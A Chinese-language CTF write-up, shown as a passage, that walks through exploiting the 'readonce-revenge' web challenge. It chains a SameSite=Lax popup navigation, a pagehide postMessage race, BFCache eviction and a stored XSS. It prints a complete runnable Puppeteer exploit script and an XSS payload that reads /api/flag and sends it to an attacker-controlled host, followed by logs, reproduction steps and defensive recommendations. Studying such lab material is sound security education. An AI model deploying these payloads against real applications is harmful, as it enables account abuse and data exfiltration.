| 脚本 nonce + Trusted Types（浏览器禁止把普通字符串直接写进页面的机制）禁用 | `/sandbox` CSP | 禁止在沙箱内注入/执行未授权脚本 |
| `SameSite=Lax` | 会话 cookie | 跨站 `fetch` 不带管理员身份 |
| Fetch Metadata 检查（`policy`） | 渲染分支 | 只接受"浏览器自己发起"的页面导航 |
| `state` 秘密随机数 | 渲染分支 | 请求必须携带服务器生成的秘密值 |
| `prepared`（必须先就绪） | 渲染分支 | 本轮审查必须真的走到机器人访问阶段 |
| `approved`（必须先批准） | 渲染分支 | 批准流程必须先完成 |
| `used`（一次性） | 渲染分支 | 渲染成功后置 true，此后同一轮审查不可复用 |
| `visited` + `view` cookie | 审查页 | 首次访问只留标记，不渲染 |
| `noteId` 必须来自提交网址 | `POST /report` | 渲染哪篇笔记由提交网址的 `note` 参数决定，不能凭空指定 |

## 四、攻击目标拆解

目标：拿到 `/api/flag` 的响应内容。直接请求必然失败（没有管理员身份），所以目标等价于"让笔记 HTML 在渲染分支里被渲染出来"（那是全站唯一不加防护的展示点）。

渲染分支要过八项检查（见 2.5 表格）。把它当成一张待办清单，逐项分析自己能不能满足：

| # | 检查项 | 攻击者视角 |
|---|---|---|
| 1 | admin 会话 | 没有。必须借机器人浏览器发起请求 |
| 2 | rid 匹配 | 知道。机器人打开提交网址时会追加 `rid`，页面脚本能读到 |
| 3 | 笔记存在 | 自己控制。创建笔记，把编号写进提交网址的 `note` 参数 |
| 4 | `policy`（Fetch Metadata） | 脚本请求伪造不了。需要"浏览器自己发起"的导航 |
| 5 | `state` 匹配 | 不知道（秘密随机数）。但它出现在机器人第一次访问的审查页 URL 上 |
| 6 | `prepared` | 机器人自动完成，不用管 |
| 7 | `approved` | 初始 false。由 `/complete` 控制，需要攻破审查界面的防线 |
| 8 | `used` | 初始 false。它不是障碍：前七项都过之后，服务器在渲染的同时把它置 true |

由此得到四个必须解决的问题：

1. **渠道问题**：怎么让自己的脚本进入机器人浏览器并打开审查界面（第 1 项）。
2. **批准问题**：怎么让审查界面调用 `/complete`（第 7 项）。
3. **时机问题**：怎么发起"第二次访问"，并且让这次访问带上正确的 rid/state（第 2、4、5 项）。
4. **外传问题**：渲染出的 XSS 怎么把 flag 带走（第 3 项由攻击者控制；其余是执行细节）。

## 五、逐步攻破

### 5.1 渠道：让脚本进入机器人浏览器

机器人第 4 件事是"整页打开你提交的网址"。提交一个攻击者控制的页面（下文叫 stage1），它的 JavaScript 就会在机器人浏览器里运行。

但有一个限制：stage1 运行在攻击者的源（例如 `http://host.docker.internal:9975`），**不是挑战域**。它不能直接 `fetch("http://localhost:3000/api/flag")`，因为跨站请求不带 `SameSite=Lax` 的 cookie，服务器会返回 403；它也没有权限打开审查界面。

突破点是 Lax 的例外规则：**顶层导航会携带 cookie**。于是 stage1 里执行：

```js
const rid = new URLSearchParams(location.search).get("rid");   // 机器人追加的 rid
// 攻击脚本地址形如 http://host.docker.internal:9975/s2p.js（第七章的 S2）
window.open("http://localhost:3000/review?u=" + 攻击脚本地址 + "&rid=" + rid, "REV");
```

这个弹窗是一次顶层导航，机器人浏览器会带上自己的管理员 cookie，请求到达挑战域时身份就是管理员。`/review` 的两个门槛（admin、rid 匹配）同时满足，审查界面成功打开，攻击脚本地址被登记为待审查文档。

审查界面打开后，其中的沙箱 iframe 会加载 `/sandbox?rid=...`，服务器用带 nonce 的 script 标签加载攻击脚本。至此，攻击脚本在审查页面内部的沙箱 iframe 里开始运行。

需要注意的是，这个弹窗只是攻击链的一环，它的使命是解决第四章的"批准问题"。主页面还有另一条并行的线（时机问题），5.3 节讲。

### 5.2 批准：页面切换瞬间的消息

回到审查界面的防线（3.4 节源码）：

```js
addEventListener("message", (e) => {
  if (!closing || e.source === viewer.contentWindow) return;   // 不合格就丢弃
  fetch("/complete", ...);                                     // 合格就批准
});
```

两个条件必须同时成立：`closing === true`（iframe 第一次加载已完成）且 `e.source !== viewer.contentWindow`（消息来源不是当前 iframe 窗口）。

正常时序下，这两个条件没有同时成立的机会：

- iframe 内的脚本刚运行就发消息（此时 load 还没完成）：`closing` 还是 false，被第一条拦掉；
- iframe 加载完成（`closing` 变 true）之后：`viewer.src` 立刻被替换成空文档，脚本已被卸载，没有机会再发消息。

唯一的时间窗在**旧文档卸载的瞬间**。页面被导航替换时，浏览器会给旧文档最后一次执行机会（`pagehide` 事件：页面即将被替换或关闭时触发的最后一个事件）。此时 `closing` 已经为 true，而消息的来源指向正在卸载的旧文档窗口；审查页读取 `viewer.contentWindow` 时，拿到的已经是接管的新文档窗口。两者不相等，防线判断失效。

用两个实验对照验证（修改攻击脚本，其余流程不变）：

**对照一：加载即发消息**（脚本第一行直接 `top.postMessage`，不等 pagehide）：

```text
REVIEW-MSG source-is-viewer=true closing=false data={"p":1}
```

两个条件全部不合格，`/complete` 从未被调用。后续步骤即使全部成功，第二次访问审查页也会因 `approved=false` 被 403 拦下。

**对照二：pagehide 时机发消息**（正式攻击脚本的写法）：

```js
addEventListener("pagehide", function () {
  try { top.postMessage({ p: 1 }, "*"); top.postMessage({ p: 2 }, "*"); } catch (e) {}
});
```

```text
REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
[debug] /complete called ... prepared=true admin=true stateMatch=true
[debug] /complete APPROVED SET!
```

防线被穿过，`/complete` 两次调用都成功（脚本连发两条消息，互为冗余），`approved` 置位。

这里的 `top` 就是从沙箱 iframe 指向审查页顶层窗口的引用；沙箱的不透明源并不会阻止 `postMessage`（浏览器提供的跨源窗口通信接口）跨越（跨源消息本来就是它的用途），消息数据也只有两个标记数字，不需要读取任何页面内容。

### 5.3 时机：让审查页被"第二次访问"

批准的问题解决了，还缺渲染分支的另外三个条件：rid 匹配、`state` 匹配、`policy`。它们的答案是**同一个**：不要自己构造请求，而是**利用机器人浏览器历史里现成的那条审查页 URL**。

机器人主页面在打开 stage1 之前，访问过两个页面：审查页（首访，带 rid 和 state）和 `/api/flag`。也就是说，那条"带秘密参数的正确 URL"就躺在浏览器的历史记录里。让它重新被访问一次，三项条件自动全中：

- rid 和 state 是 URL 自带的；
- 历史回退是浏览器自己发起的导航，请求头天然带 `Sec-Fetch-Site: none`（无来源）和 `Sec-Fetch-Dest: document`（整页），`policy` 自动通过。

但回退有一个陷阱：**BFCache**（Back/Forward Cache，前进后退缓存）。浏览器会把最近访问过的页面整体缓存在内存里（包括页面结构 DOM（Document Object Model，文档对象模型）和 JavaScript 状态），按后退键时优先从缓存恢复。从缓存恢复不会向服务器发请求，服务器根本不知道"第二次访问"发生过。

对照实验可以直接展示这个差异：

**直接回退**（让机器人打开一个 4 秒后自动执行 `history.go(-10)` 的页面）：

```text
（日志只有首访、api/flag、stage1 三条，回退后没有任何新请求）
```

**先做 8 次连续导航，再回退**：

```text
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?ph=evict&nn=1
...（nn=2 到 nn=8）
[bot-req:main] GET http://localhost:3000/reports/check?rid=...&state=...
[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
```

对照实验中：直接回退命中了 BFCache（无请求，链路死掉）；先连开 8 个新文档再回退，才变成真实的网络请求。原因是 Chromium（Chrome 浏览器的开源内核）给每个标签页的 BFCache 条目数量设置有上限，**连续加载足够多的新文档会把最早的条目挤出缓存**，被挤出的条目再回退时只能重新向服务器请求。

stage1 里负责这件事的代码：

```js
// 每次导航间隔 120ms，连做 8 次，把历史堆到 11 条
if (nn < 8) { setTimeout(() => { location.href = location.pathname + "?ph=evict&nn=" + (nn + 1); }, 120); }
else { setTimeout(() => { history.go(-10); }, 200); }   // 回退 10 步到栈底
```

为什么是 `go(-10)`：回退动作发生时，主页面历史栈共 11 条（审查页首访、api/flag、stage1、8 个自导航变体）。从栈顶的第 11 条回退 10 步，正好落在栈底的审查页条目上。

### 5.4 渲染与外传

回退触发的这次请求通过了渲染分支的全部检查：

```text
2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
```

服务器先把 `used` 置为 true（防止同一轮审查被重复消费），然后渲染模板 `review-document.ejs`：笔记 HTML 被原样插入页面，且该响应没有任何 CSP。此时页面上出现的是攻击者笔记里存好的 XSS 代码（创建笔记时写入，长度约 110 个字符，刚好塞进 128 个字符的上限）：

```html
<img src=q onerror='fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:9975/f?"+t)'>
```

执行细节：

1. `img` 的地址 `q` 不存在，加载失败触发 `onerror`（服务端日志里能看到 `GET /reports/q` 返回 404，证明笔记 HTML 被真正解析进页面并执行了）。
2. `fetch("/api/flag")` 是同源请求，自动携带管理员的 `sid` cookie；flag 早在机器人第 2 件事时就被写进了本轮审查记录（`currentReview.flag`），所以服务器直接返回。
3. 拿到响应后，用 `location` 跳转到攻击者服务器，把结果放在查询串里带走。这里用页面跳转而不是 `fetch` 上传，好处是不涉及跨域读取与 CORS（Cross-Origin Resource Sharing，跨源资源共享：浏览器允许跨源读取响应的一套规则），也不需要目标页面允许任何连接（该页面本身没有 CSP，两条路都通，跳转最省字节）。

攻击者服务器收到形如 `/f?{"flag":"..."}` 的请求，取出 flag。

### 5.5 整条链的时序全览

| 时刻 | 主体 | 动作 | 服务端状态变化 |
|---|---|---|---|
| T+0 | 攻击者 | 提交含 XSS 笔记编号的 stage1 网址 | 创建本轮审查记录 |
| T+1s | 机器人 | 首次访问审查页 | `visited=true`，发放 view cookie |
| T+1s | 机器人 | 访问 `/api/flag` | `flag` 写入内存 |
| T+1s | 机器人 | 调用 `/reports/arm` | `prepared=true` |
| T+1s | 机器人 | 打开 stage1（自动附加 rid） |  |
| T+1s | stage1 | 弹窗打开审查界面，攻击脚本登记为待审查文档 | `document` 写入 |
| T+1s | 审查界面 | 沙箱 iframe 加载攻击脚本 |  |
| T+2s | 攻击脚本 | iframe 被替换的瞬间（pagehide）投递消息 |  |
| T+2s | 审查界面 | 调用 `/complete` | `approved=true` |
| T+4.5s | stage1 | 开始连续 8 次自导航 |  |
| T+5.5s | stage1 | `history.go(-10)` 回退到审查页 |  |
| T+5.5s | 机器人 | 审查页被真实重新请求，全部检查通过 | `used=true`，渲染笔记原文 |
| T+5.5s | 渲染出的页面上的 XSS 代码 | 读 `/api/flag`，跳转攻击者服务器 | flag 外传 |
| T+11s | 机器人 | 10 秒停留结束，关闭浏览器 | 本轮审查记录清空 |

## 六、完整链复现日志

攻击脚本对本地环境运行一次，标准输出：

```text
[c] Failed to load resource: the server responded with a status of 404 (Not Found)
[note] 89ab25b00447b966c54f
[!!!!FLAG!!!!] {"flag":"pwnsec{real_flag_on_remote}"}
[report] 200 — 完整链执行中 (popup approved + 挤出链)...
```

同一时刻，服务器侧日志（按时间顺序，省略重复行）：

```text
# 机器人开始工作：审查页首访
[bot-req:main] GET http://localhost:3000/reports/check?rid=a551e4289172dffd677b96d4&state=995638e087ec1873cb90be34cdd99f89
[check-debug] rid=a551e428 admin=true secSite=none secDest=document visited=false

# flag 载入内存
[bot-req:main] GET http://localhost:3000/api/flag

# 机器人打开攻击者页面（note 参数是本轮绑定的笔记编号，rid 由机器人追加）
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?note=89ab25b00447b966c54f&rid=a551e4289172dffd677b96d4

# 弹窗里的审查界面完成 pagehide 竞态，批准成功
[bot-console:main+popup:log] REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
[debug] /complete called id=a551e4289172dffd677b96d4 state=995638e087ec1873cb90be34cdd99f89 prepared=true admin=true stateMatch=true
[debug] /complete APPROVED SET! id=a551e4289172dffd677b96d4
[bot-console:main+popup:log] COMPLETE-RESP 200

# 主页面连续 8 次自导航（挤出 BFCache）
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?ph=evict&nn=1
...（nn=2 至 nn=8）

# 历史回退触发真实的第二次访问，全部检查通过
[bot-req:main] GET http://localhost:3000/reports/check?rid=a551e4289172dffd677b96d4&state=995638e087ec1873cb90be34cdd99f89
[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false

# 渲染的笔记触发 XSS：图片加载失败、读 flag、外传
[bot-req:main] GET http://localhost:3000/reports/q                     # <img src=q> 的相对路径
[bot-req:main] GET http://localhost:3000/api/flag                      # XSS 的同源读取
[bot-frame-nav:main] http://host.docker.internal:9975/f?{"flag":"pwnsec{real_flag_on_remote}"}
```

每一行都能和前面的分析对上：`source-is-viewer=false` 对应 5.2 的竞态，`nn=1..8` 对应 5.3 的挤出，`2nd-visit` 行的 `approved=true` 对应批准生效后的放行，最后的 `/f?...` 就是 flag 外传。

## 七、攻击脚本逐段讲解

完整攻击脚本如下（注释为整理时补写，代码逻辑与原脚本一致）。运行前先改脚本开头的两处路径：`CHROME` 指向本机浏览器、`puppeteer` 指向你解压的题目目录（本文示例里的 `handout` 是当时的解压目录名）。这类"从触发到拿结果"的完整利用代码常被称为 exploit（漏洞利用），下面随代码逐段对照前文：

```js
// readonce-revenge 完整攻击脚本：弹窗批准 + 主标签挤出链 + XSS 外传
const http = require("node:http");
const CHROME = "/Users/aserlili/Library/Caches/ms-playwright/chromium-1223/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing";
const puppeteer = require("/Users/aserlili/bw-security-analysis/workspace/20260913_090327_34a3_web-analysis/handout/bot/node_modules/puppeteer");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const PORT = 9975;
const CHAL = "http://localhost:3000";

// 这段脚本会被注入沙箱运行：pagehide 时向顶层投递两条消息（5.2 节）
const S2 = 'addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });';

const srv = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  // 收信箱：flag 以查询串形式到达
  if (u.pathname === "/f") { console.log("\n[!!!!FLAG!!!!]", decodeURIComponent(u.search.slice(1)).slice(0, 100)); res.writeHead(200); res.end(); return; }
  // 沙箱中运行的攻击脚本（注入后就是上面的 S2）
  if (u.pathname === "/s2p.js") { res.writeHead(200, {"Content-Type":"application/javascript"}); res.end(S2); return; }
  // 机器人要访问的页面：弹窗 + 挤出链
  if (u.pathname === "/stage1") {
    res.writeHead(200, {"Content-Type":"text/html"});
    res.end('<!doctype html><body>S1<script>\n' +
      'var rid = new URLSearchParams(location.search).get("rid");\n' +
      'var note = new URLSearchParams(location.search).get("note");\n' +
      // 弹窗打开审查界面（顶层导航带管理员 cookie），u 指向 S2
      'window.open("' + CHAL + '/review?u=http%3A%2F%2Fhost.docker.internal%3A' + PORT + '%2Fs2p.js&rid=" + rid + "&note=" + note, "REV");\n' +
      // 主标签：3.5 秒后开始连续自导航，把审查页挤出 BFCache
      'var ph = new URLSearchParams(location.search).get("ph");\n' +
      'var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");\n' +
      'if (ph === "evict") {\n' +
      '  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }\n' +
      '  else { setTimeout(function(){ history.go(-10); }, 200); }\n' +
      '} else { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500); }\n' +
      '</scr' + 'ipt></body>');
    return;
  }
  res.writeHead(404); res.end();
});
srv.listen(PORT, async () => {
  try {
    const browser = await puppeteer.launch({ executablePath: CHROME, headless: "new", args: ["--no-sandbox"] });
    const p = await browser.newPage();
    p.on("console", m => console.log("[c]", m.text().slice(0, 110)));
    await p.setExtraHTTPHeaders({ "X-Bot-Token": "local-bot-token" });
    await p.goto(CHAL + "/reports/session", { waitUntil: "domcontentloaded" });
    await p.setExtraHTTPHeaders({});
    // 创建含 XSS 的笔记（注入的 note 编号进 URL，供 /report 提取）
    const note = await p.evaluate(async (o, port) => {
      const r = await fetch(o + "/create", { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"},
        body: "title=p&html=" + encodeURIComponent('<img src=q onerror=\'fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:'+port+'/f?"+t)\'>') });
      const m = (r.url||"").match(/note\/([a-f0-9]+)/); return m ? m[1] : "FAIL";
    }, CHAL, PORT);
    console.log("[note]", note);
    // 提交 stage1 网址（带 note 参数），此后全自动
    const st = await p.evaluate(async (o, s, n) => {
      const r = await fetch(o + "/report", { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"},
        body:"url="+encodeURIComponent(s+"?note="+n) });
      return r.status;
    }, CHAL, "http://host.docker.internal:"+PORT+"/stage1", note);
    console.log("[report]", st, "— 完整链执行中 (popup approved + 挤出链)...");
    await sleep(16000);
    await browser.close();
  } catch (e) { console.log("ERR", e.message); }
  finally { srv.close(); process.exit(0); }
});
```

脚本结构对应前文各节：

| 脚本部分 | 作用 | 对应章节 |
|---|---|---|
| `/reports/session` 一行 | 调试残留：把脚本内浏览器升级为管理员（创建笔记与提交审查都不检查身份，这一步对主链没有功能贡献，保留以与实测脚本一致） | 3.1 |
| `p.evaluate(fetch /create)` | 创建含 XSS 的笔记，取回编号 | 5.4 |
| `p.evaluate(fetch /report)` | 提交 `stage1?note=编号`，触发机器人 | 5.1 |
| `/stage1` 页面的 `window.open` | 弹窗打开审查界面，登记 S2 | 5.1 |
| `/s2p.js` 的 pagehide 逻辑 | 穿过审查界面的身份检查，触发批准 | 5.2 |
| `ph=evict` 导航链 + `go(-10)` | 挤出 BFCache，触发第二次访问 | 5.3 |
| XSS 笔记 + `/f` 收信箱 | 读 flag 并外传 | 5.4 |

脚本有两个容易忽略的细节。第一，stage1 的 URL 里带着笔记编号（`?note=`），这是给 `POST /report` 提取 `currentReview.noteId` 用的；弹窗地址里同样带着 `note`，但审查界面不读它，只是原样透传。第二，页面用 `'</scr' + 'ipt>'` 拼接出 script 结束标签：这段内联脚本里任何位置只要出现完整的 `</script>`，HTML 解析器都会当场结束脚本（后续代码变成页面文本），所以必须拆开写。

## 八、复现指南

### 环境要求

- Docker（含 compose 插件）；
- Node.js 18 及以上，用于在宿主机运行攻击脚本；
- 一个可用的 Chrome/Chromium 浏览器（Chromium 是 Chrome 的开源版本）。脚本默认使用本机 playwright（一个浏览器自动化工具，安装时会缓存 Chromium）中的浏览器，路径写死在脚本第 2 行，按本机情况修改即可；
- 攻击脚本依赖的 `puppeteer` 模块（puppeteer：用代码控制 Chrome 自动化操作的库，题目机器人也基于它，见 3.3）直接取自题目附件（题目解压目录下的 `bot/node_modules/puppeteer`），无需另外安装。

### 步骤

```bash
# 1. 启动题目环境（首次构建约 1 到 2 分钟）
cd readonce-revenge
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/    # 期望 200

# 2. 把第七章的完整脚本保存成 solve_revenge_final.js（放在任意目录，能访问 localhost:3000 即可），
#    改好开头的两处路径（CHROME、puppeteer）后运行
node solve_revenge_final.js
```

期望输出：

```text
[c] Failed to load resource: the server responded with a status of 404 (Not Found)
[note] 89ab25b00447b966c54f
[!!!!FLAG!!!!] {"flag":"pwnsec{real_flag_on_remote}"}
[report] 200 — 完整链执行中 (popup approved + 挤出链)...
```

`[!!!!FLAG!!!!]` 后面 JSON（JavaScript Object Notation，一种文本数据格式）里的值就是外传的 flag；其中 `real_flag_on_remote` 来自 compose 环境变量，改成别的值即验证读到的是配置值。

### 观察与调试

想看每一步，另开一个终端：

```bash
docker logs -f readonce-revenge-challenge-1
```

（容器名由 compose 项目名生成，项目名默认取目录名，因此以 `readonce-revenge/` 为解压目录时容器名即上例；如报“无此容器”，用 `docker ps` 查看实际名字。）

完整链经过的日志锚点（出现顺序）：

1. `check-debug ... visited=false`：机器人首访审查页；
2. `REVIEW-MSG source-is-viewer=false closing=true`：pagehide 竞态命中；
3. `APPROVED SET`：批准置位；
4. `stage1?ph=evict&nn=1` 至 `nn=8`：挤出导航；
5. `2nd-visit ... approved=true`：第二次访问全部通过；
6. `GET /reports/q`（404，XSS 图片）与 `GET /f?{...}`（外传）。

### 常见问题

| 现象 | 原因与处理 |
|---|---|
| `[report] 429` | 上一轮审查还没结束（每轮约忙 10 秒），稍等重试 |
| 一直收不到 flag，日志停在 `nn=8` 之后没有 `2nd-visit` | 挤出次数不够，个别环境 BFCache 上限更高，把脚本里的 `nn < 8` 调大（如 12）再试 |
| 收不到 flag，`2nd-visit` 行缺少 `approved=true` | 弹窗没跑起来。检查 Chrome 能否弹窗、脚本里的攻击脚本地址（`S2` 变量）是否指向 `host.docker.internal:<端口>` |
| Linux 主机 | `host.docker.internal` 需要 compose 里加 `extra_hosts: ["host.docker.internal:host-gateway"]`，或在 stage1 与 XSS 里改用宿主机的局域网地址 |
| 换端口 | compose 映射与脚本 `CHAL` 变量需同步修改 |

## 九、防御建议

从这条链出发，可以给同类"自动化审查"系统几条通用建议：

1. **批准信号不要用"窗口身份比较"实现。** 本次的 `/complete` 触发依赖 `e.source === viewer.contentWindow` 这种时序敏感的判断。更稳的做法是使用 `MessageChannel`（浏览器提供的点对点消息通道）把端口显式交给受信任的一方，或者让服务端生成一次性挑战值、要求通过既定的通道返回。
2. **一次性 URL 的"一次性"要覆盖完整生命周期。** 本例的 `rid/state` 在一次审查中可被重复使用（批准前后都可），历史里的旧 URL 因此是有效凭证。让 state 在首次消费后立即失效、或与一次性票据（single-use token）绑定，能切断"重放历史 URL"这条路。
3. **不要假设历史导航一定会命中内存缓存。** BFCache 的容量、驱逐策略因浏览器和版本而异。本次攻击正是主动把缓存条目挤出，使"回退"退化为"重新请求"。防御方设计控制流时不能把"回退没有网络请求"当安全前提。
4. **Fetch Metadata 只能作为纵深防御。** `Sec-Fetch-Site: none` 对用户主动发起的导航天然为真，无法区分"真人回退"与"被脚本驱动的回退"。
5. **统一所有渲染出口的 CSP。** 笔记预览页有严格 CSP，审查渲染分支却直接原样输出笔记 HTML 且无 CSP。用户内容在哪里被展示，哪里就需要一致的防护。
6. **沙箱机制本身工作正常。** 不透明源、`script-src` nonce、Trusted Types 禁用都按预期拦住了越权访问；出问题的是"批准"语义，而不是隔离强度。
7. **机器人口令与会话密钥要用强随机值、从环境注入。** `BOT_TOKEN` 若沿用默认值或可猜，等于把管理员会话的验证码公开：攻击者直接冒充机器人就能在审查窗口期读走 flag，无需任何前端攻击。`SESSION_SECRET` 是 cookie 完整性的纵深防线，在服务器端会话存储的架构下单独泄漏难以直接利用，但配错会导致重启后会话全部失效、多实例间会话漂移。

## 附录

### 附 A：源码文件对照

| 文件 | 作用 |
|---|---|
| `src/server.js` | 全部路由、会话、状态机（`currentReview`）、防护检查 |
| `src/views/review.ejs` | 审查界面：沙箱 iframe + 消息/批准逻辑 |
| `src/views/sandbox.ejs` | 沙箱页：带 nonce 的 script 标签加载攻击脚本 |
| `src/views/review-document.ejs` | 渲染分支的模板：原样输出笔记 HTML（无 CSP） |
| `src/views/note.ejs` | 预览页模板：转义输出（有 CSP） |
| `bot/bot.js` | 机器人程序：管理员会话、固定四件事、10 秒停留 |

### 附 B：术语速查

| 术语 | 一句话说明 |
|---|---|
| CTF | Capture The Flag，网络安全夺旗赛 |
| flag | 比赛的最终目标字符串（本题格式 `pwnsec{...}`） |
| Docker | 容器工具：把程序打包进隔离环境运行 |
| CSP | Content Security Policy，内容安全策略：浏览器限制页面能加载和执行哪些内容 |
| XSS | Cross-Site Scripting，跨站脚本攻击：让攻击者的脚本在受害网站页面上执行 |
| HTML | HyperText Markup Language，网页的组成语言 |
| HTTP | HyperText Transfer Protocol，超文本传输协议：浏览器和服务器之间的通信规则 |
| URL | Uniform Resource Locator，即网址 |
| JSON | JavaScript Object Notation，一种文本数据格式 |
| iframe | HTML 里"在页面中嵌入另一个页面"的标签 |
| nonce | number used once，一次性随机数：服务器生成，用来证明内容或请求出自服务器 |
| 审查页（`/reports/check`） | 机器人的审查入口页。首访留标记；二访进入渲染分支，全部检查通过才输出笔记原文 |
| 审查界面（`/review`） | 管理员页面，内含沙箱 iframe 与批准逻辑，是攻击脚本的入口 |
| BFCache | 浏览器把访问过的页面整体缓存进内存的机制；回退时优先恢复，不产生网络请求 |
| Fetch Metadata | 请求头 `Sec-Fetch-*` 系列，标明请求由谁发起；浏览器自动附加，脚本无法伪造 |
| Opaque Origin（不透明源） | `sandbox` 属性不带 `allow-same-origin` 时，iframe 内容得到的"匿名"源，与任何站点都不同源 |
| SameSite=Lax | cookie 属性：跨站请求不带 cookie，但顶层导航例外 |
| pagehide | 页面被导航替换/关闭前触发的事件，是页面最后一次执行 JavaScript 的机会 |
| postMessage | 跨源窗口之间传递消息的 API，不要求同源 |
| WindowProxy | 浏览器给窗口对象套的代理，页面脚本访问 `window`、`contentWindow` 拿到的都是它 |
| headless | 无界面模式：浏览器不显示窗口，只由程序驱动 |

### 附 C：本地环境版本

| 组件 | 版本/说明 |
|---|---|
| 挑战服务器运行时 | 容器内 `node:22-bookworm-slim` + Chromium |
| 本地复现时的机器人浏览器 | 本机 Chromium（playwright 缓存，headless 无界面模式） |
| Docker 端口 | `3000:3000` |

（完）
